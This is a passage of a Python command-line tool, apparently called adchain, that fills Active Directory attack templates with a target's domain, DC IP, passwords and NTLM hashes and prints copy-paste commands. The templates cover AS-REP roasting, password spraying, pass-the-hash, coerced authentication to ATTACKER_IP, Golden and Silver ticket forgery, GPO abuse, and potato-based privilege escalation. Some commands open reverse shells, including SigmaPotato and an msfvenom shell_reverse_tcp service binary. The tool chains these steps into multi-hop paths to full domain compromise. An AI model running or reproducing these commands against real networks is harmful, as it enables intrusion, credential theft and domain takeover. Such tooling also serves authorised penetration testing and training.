                "cmd": "nxc ldap {dc_ip} -u users.txt -p '' --asreproast asrep.hash\n# Or with valid creds:\nnxc ldap {dc_ip} -u {source} -p '{password}' --asreproast asrep.hash\n# If DNS fails:\nnxc ldap {dc_ip} -u {source} -p '{password}' --asreproast asrep.hash --kdcHost {domain}",
            },
            {
                "tool": "Impacket",
                "cmd": "impacket-GetNPUsers '{domain}/' -usersfile users.txt -no-pass -dc-ip {dc_ip} -outputfile asrep.hash",
            },
            {
                "tool": "Rubeus (Windows foothold)",
                "cmd": "Rubeus.exe asreproast /outfile:asrep.hash",
            },
            {
                "tool": "Hashcat crack",
                "cmd": "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt",
            },
        ],
    },

    "Password Spray": {
        "desc": "Test one password against many accounts",
        "attacks": [
            {
                "tool": "NXC",
                "cmd": "nxc smb {dc_ip} -u users.txt -p 'Welcome1!' -d {domain} --continue-on-success",
            },
            {
                "tool": "kerbrute",
                "cmd": "kerbrute passwordspray -d {domain} --dc {dc_ip} users.txt 'Welcome1!'",
            },
        ],
    },

    "Pass-the-Hash": {
        "desc": "Authenticate with an NTLM hash instead of a password",
        "attacks": [
            {
                "tool": "Impacket psexec",
                "cmd": "impacket-psexec '{domain}/{source}'@{target} -hashes :{hash}",
            },
            {
                "tool": "Impacket wmiexec",
                "cmd": "impacket-wmiexec '{domain}/{source}'@{target} -hashes :{hash}",
            },
            {
                "tool": "Evil-WinRM",
                "cmd": "evil-winrm -i {target} -u {source} -H '{hash}'",
            },
            {
                "tool": "NXC",
                "cmd": "nxc smb {target} -u {source} -H '{hash}' -d {domain} -x 'whoami'",
            },
        ],
    },

    "Coerced Authentication": {
        "desc": "Force a machine to authenticate to your listener (PetitPotam, PrinterBug, coerce_plus, etc.)",
        "attacks": [
            {
                "tool": "NXC coerce_plus module (easiest)",
                "cmd": "nxc smb {target} -u {source} -p '{password}' -M coerce_plus -o LISTENER=ATTACKER_IP",
                "note": "Tries multiple coercion methods automatically — catches with Responder",
            },
            {
                "tool": "Responder (capture hashes)",
                "cmd": "sudo responder -I tun0",
                "note": "Start this BEFORE coercing — captures Net-NTLMv2",
            },
            {
                "tool": "NXC slinky (writeable share coercion)",
                "cmd": "nxc smb {target} -u 'Guest' -p '' -M slinky -o SERVER=ATTACKER_IP NAME=not-malicious SHARES=Uploads",
                "note": "Plants an .lnk file in a share — triggers auth when anyone browses it",
            },
            {
                "tool": "PetitPotam",
                "cmd": "python3 PetitPotam.py -u {source} -p '{password}' -d {domain} ATTACKER_IP {target}",
            },
            {
                "tool": "Inveigh (Windows foothold capture)",
                "cmd": "Inveigh.exe -ConsoleOutput Y -FileOutput Y",
                "note": "Run on Windows foothold to capture Net-NTLMv2",
            },
            {
                "tool": "Hashcat (NTLMv2)",
                "cmd": "hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt",
            },
        ],
    },

    "Silver Ticket": {
        "desc": "Forge a service ticket using a service account's NTLM hash",
        "attacks": [
            {
                "tool": "Impacket ticketer",
                "cmd": "impacket-ticketer -nthash {hash} -domain-sid S-1-5-21-... -domain {domain} -spn cifs/{target}.{domain} Administrator\nexport KRB5CCNAME=Administrator.ccache\nimpacket-psexec -k -no-pass {target}.{domain}",
            },
        ],
    },

    "Golden Ticket": {
        "desc": "Forge a TGT using the krbtgt hash — full domain compromise",
        "attacks": [
            {
                "tool": "Impacket ticketer",
                "cmd": "impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-... -domain {domain} Administrator\nexport KRB5CCNAME=Administrator.ccache\nimpacket-psexec -k -no-pass {dc_ip}",
            },
            {
                "tool": "Mimikatz",
                "cmd": "mimikatz # kerberos::golden /user:Administrator /domain:{domain} /sid:S-1-5-21-... /krbtgt:<KRBTGT_HASH> /ptt",
            },
        ],
    },

    "GPO Abuse": {
        "desc": "Modify Group Policy to push malicious config to targets",
        "attacks": [
            {
                "tool": "pyGPOAbuse",
                "cmd": "python3 pygpoabuse.py '{domain}/{source}:{password}' -gpo-id '<GPO_ID>' -command 'net localgroup Administrators {source} /add' -f",
            },
            {
                "tool": "SharpGPOAbuse",
                "cmd": "SharpGPOAbuse.exe --AddComputerTask --TaskName \"Pwned\" --Author NT AUTHORITY\\SYSTEM --Command \"cmd.exe\" --Arguments \"/c net localgroup Administrators {source} /add\" --GPOName \"<GPO_NAME>\"",
            },
        ],
    },

    "Token Impersonation": {
        "desc": "Abuse SeImpersonate/SeAssignPrimary privilege — common from MSSQL/IIS service accounts",
        "attacks": [
            {
                "tool": "GodPotato",
                "cmd": "GodPotato.exe -cmd 'cmd /c whoami'",
            },
            {
                "tool": "SigmaPotato",
                "cmd": "SigmaPotato.exe --revshell --host ATTACKER_IP --port 4444",
            },
            {
                "tool": "PrintSpoofer",
                "cmd": "PrintSpoofer64.exe -i -c cmd",
            },
            {
                "tool": "JuicyPotato (older systems)",
                "cmd": "JuicyPotato.exe -l 1337 -p cmd.exe -t * -c '{CLSID}'",
            },
        ],
    },

    "Service Binary Hijack": {
        "desc": "Replace or modify a service binary/binpath for privilege escalation",
        "attacks": [
            {
                "tool": "sc.exe (Server Operators / service control)",
                "cmd": "sc.exe config <SERVICE_NAME> binPath= \"cmd /c net localgroup Administrators {source} /add\"\nsc.exe stop <SERVICE_NAME>\nsc.exe start <SERVICE_NAME>",
            },
            {
                "tool": "msfvenom (service exe)",
                "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o svc.exe\n# Copy svc.exe to the writable service binary path\n# Restart the service",
            },
        ],
    },
}


# ═══════════════════════════════════════════════════════════
#                  CHAIN BUILDER
# ═══════════════════════════════════════════════════════════

def fill_template(cmd, ctx):
    """Replace placeholders in a command template."""
    # Build domain_dn from domain (e.g. corp.local → DC=corp,DC=local)
    domain = ctx.get("domain", "YOURDOMAIN")
    domain_dn = ",".join(f"DC={p}" for p in domain.split("."))
    ctx["domain_dn"] = domain_dn

    result = cmd
    for key, val in ctx.items():
        result = result.replace("{" + key + "}", str(val))

    # Resolve impacket tool names for this platform
    # (Arch/pipx: impacket-X  |  Exegol/Kali: X.py or bare alias)
    for canonical, alternatives in _IMPACKET_ALIASES.items():
        if canonical in result:
            resolved = _resolve(canonical, alternatives)
            if resolved != canonical:
                result = result.replace(canonical, resolved)

    return result


def print_attack(relationship, ctx, indent="  "):
    """Print all attack options for a given relationship."""
    entry = ATTACKS.get(relationship) or STANDALONE_ATTACKS.get(relationship)
    if not entry:
        print(f"{indent}{red('[!]')} Unknown relationship: {relationship}")
        print(f"{indent}{dim('    Run --cheatsheet to see all supported types')}")
        return

    risk_colors = {"CRITICAL": red, "HIGH": yellow, "MEDIUM": blue}
    risk = entry.get("risk", "")
    risk_fn = risk_colors.get(risk, dim)

    print(f"\n{indent}{bold(green(relationship))} {risk_fn(f'[{risk}]') if risk else ''}")
    print(f"{indent}{dim(entry['desc'])}")

    for i, atk in enumerate(entry["attacks"], 1):
        tool = atk["tool"]
        cmd = fill_template(atk["cmd"], ctx)
        note = atk.get("note", "")

        print(f"\n{indent}  {yellow(f'Option {i}:')} {bold(tool)}")
        if note:
            print(f"{indent}  {dim(note)}")
        for line in cmd.split("\n"):
            print(f"{indent}    {cyan(line)}")


def run_chain(args):
    """Process a multi-hop attack chain."""
    ctx = {
        "domain": args.domain or "YOURDOMAIN",
        "dc_ip": args.dc_ip or "DC_IP",
        "source": "",
        "target": "",
        "password": args.password or "PASSWORD",
        "hash": args.hash or "NTLM_HASH",
        "target_group": "",
    }

    # Parse chain: "user1>GenericAll>user2>WriteDACL>group3>DCSync>domain"
    parts = args.chain.split(">")

    if len(parts) < 3 or len(parts) % 2 == 0:
        print(f"\n  {red('[!]')} Chain format: source>RELATIONSHIP>target>RELATIONSHIP>target...")
        print(f"  {dim('    Example: s.fisher>GenericAll>svc_backup>DCSync>domain')}")
        sys.exit(1)

    # Extract hops
    hops = []
    for i in range(0, len(parts) - 1, 2):
        source = parts[i].strip()
        relationship = parts[i + 1].strip()
        target = parts[i + 2].strip() if i + 2 < len(parts) else "???"
        hops.append((source, relationship, target))

    print(f"\n  {bold('Attack Chain')} ({len(hops)} hops)")
    print(f"  {dim('─' * 50)}")

    # Visual chain
    chain_str = ""
    for i, (src, rel, tgt) in enumerate(hops):
        if i == 0:
            chain_str += f"{green(src)}"
        chain_str += f" ─{yellow(rel)}→ {green(tgt)}"
    print(f"  {chain_str}\n")

    for i, (src, rel, tgt) in enumerate(hops):
        ctx["source"] = src
        ctx["target"] = tgt
        print(f"  {bold(f'═══ Step {i+1}/{len(hops)} ═══')}")
        print_attack(rel, ctx)

        # After each hop, suggest how to use the new access
        if rel in ("ForceChangePassword", "GenericAll") and i < len(hops) - 1:
            print(f"\n  {dim(f'  → Now authenticate as {tgt} with the new password')}")
        elif rel == "DCSync":
            print(f"\n  {dim('  → Grab Administrator NTLM hash from the dump')}")
            print(f"  {dim('  → PtH with psexec/wmiexec/evil-winrm')}")

    print(f"\n  {bold('─' * 50)}")
    print(f"  {green('[*]')} Chain complete — {len(hops)} hops from {hops[0][0]} to {hops[-1][2]}\n")


def run_single(args):
    """Look up a single relationship."""
    ctx = {
        "domain": args.domain or "YOURDOMAIN",
        "dc_ip": args.dc_ip or "DC_IP",
        "source": args.source or "SOURCE_USER",
        "target": args.target or "TARGET_USER",
        "password": args.password or "PASSWORD",
        "hash": args.hash or "NTLM_HASH",
    }
    print_attack(args.relationship, ctx)
    print()


def run_cheatsheet(args):
    """Dump the entire AD attack reference."""
    ctx = {
        "domain": args.domain or "YOURDOMAIN",
        "dc_ip": args.dc_ip or "DC_IP",
        "source": args.source or "SOURCE_USER",
        "target": args.target or "TARGET",
        "password": args.password or "PASSWORD",
        "hash": args.hash or "NTLM_HASH",
    }

    print(f"\n  {bold(cyan('═══ BloodHound Relationship Attacks ═══'))}\n")
    for rel in ATTACKS:
        print_attack(rel, ctx)

    print(f"\n\n  {bold(cyan('═══ Standalone AD Attacks ═══'))}\n")
    for rel in STANDALONE_ATTACKS:
        print_attack(rel, ctx)

    print()


def run_list(args):
    """List all supported relationships and attack types."""
    print(f"\n  {bold(cyan('BloodHound Relationships:'))}")
    for name, entry in ATTACKS.items():
        risk = entry.get("risk", "")
        risk_colors = {"CRITICAL": red, "HIGH": yellow, "MEDIUM": blue}
        risk_fn = risk_colors.get(risk, dim)
        print(f"    {green(name):<30} {risk_fn(f'[{risk}]'):<12} {dim(entry['desc'][:60])}")

    print(f"\n  {bold(cyan('Standalone Attacks:'))}")
    for name, entry in STANDALONE_ATTACKS.items():
        print(f"    {green(name):<30} {dim(entry['desc'][:60])}")
    print()


# ═══════════════════════════════════════════════════════════
#                        CLI
# ═══════════════════════════════════════════════════════════

def parse_args():
    p = argparse.ArgumentParser(
        description="AD Attack Chain Runner — BloodHound to shell in copy-paste commands",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Examples:
              # Multi-hop chain
              adchain chain "s.fisher>GenericAll>svc_backup>DCSync>domain" -d corp.local --dc-ip 10.10.10.5 -p 'Welcome1!'

              # Single relationship lookup
              adchain lookup GenericAll -s s.fisher -t svc_backup -d corp.local --dc-ip 10.10.10.5 -p 'Welcome1!'

              # Full cheatsheet with your domain context
              adchain cheatsheet -d corp.local --dc-ip 10.10.10.5

              # List all supported relationships
              adchain list
        """),
    )

    sub = p.add_subparsers(dest="mode", help="Operating mode")

    # Shared arg helper
    def add_shared(sp):
        sp.add_argument("-d", "--domain", help="Target domain (e.g. corp.local)")
        sp.add_argument("--dc-ip", help="Domain Controller IP")
        sp.add_argument("-p", "--password", help="Current password for source user")
        sp.add_argument("-H", "--hash", help="NTLM hash for PtH")
        sp.add_argument("-s", "--source", help="Source / compromised user")
        sp.add_argument("-t", "--target", help="Target user/group/object")

    # Chain mode
    ch = sub.add_parser("chain", help="Process a multi-hop attack chain")
    ch.add_argument("chain", help="Chain string: source>REL>target>REL>target (use > as separator)")
    add_shared(ch)

    # Lookup mode
    lk = sub.add_parser("lookup", help="Look up a single relationship")
    lk.add_argument("relationship", help="BloodHound relationship or attack name")
    add_shared(lk)

    # Cheatsheet mode
    cs = sub.add_parser("cheatsheet", help="Dump the full AD attack reference")
    add_shared(cs)

    # List mode
    sub.add_parser("list", help="List all supported relationships")

    return p.parse_args()


def main():
    args = parse_args()
    print(BANNER)

    if not args.mode:
        print(f"  Usage: python3 adchain.py {{chain,lookup,cheatsheet,list}} [options]")
        print(f"  Run {bold('python3 adchain.py chain -h')} for chain mode help\n")

        # Show a quick example
        print(f"  {bold('Quick example:')}")
        print(f"    {cyan('python3 adchain.py chain')} "
              f"{yellow('\"s.fisher>GenericAll>svc_backup>DCSync>domain\"')} "
              f"{dim('-d corp.local --dc-ip 10.10.10.5 -p Welcome1!')}\n")
        sys.exit(0)

    if args.mode == "chain":
        run_chain(args)
    elif args.mode == "lookup":
        run_single(args)
    elif args.mode == "cheatsheet":
        run_cheatsheet(args)
    elif args.mode == "list":
        run_list(args)


if __name__ == "__main__":
    main()
